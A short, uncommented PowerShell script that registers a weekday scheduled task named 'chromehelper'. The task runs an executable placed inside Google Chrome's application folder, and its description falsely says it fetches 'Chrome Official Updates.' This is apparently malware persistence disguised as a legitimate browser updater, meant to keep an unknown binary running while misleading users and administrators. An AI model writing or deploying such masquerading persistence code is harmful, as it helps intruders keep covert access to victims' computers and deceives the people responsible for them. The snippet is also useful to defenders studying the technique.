$outpath = "C:\Program Files (x86)\Google\Chrome\Application\44.0.2403.155\chromehelper.exe"
$action = New-ScheduledTaskAction -Execute $outpath
$days = 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday'
$trigger = New-ScheduledTaskTrigger -weekly -DaysOfWeek $days -At 9am
Register-ScheduledTask -Action $action -Trigger $trigger -Taskname "chromehelper" -Description "This task grabs Chrome Official Updates."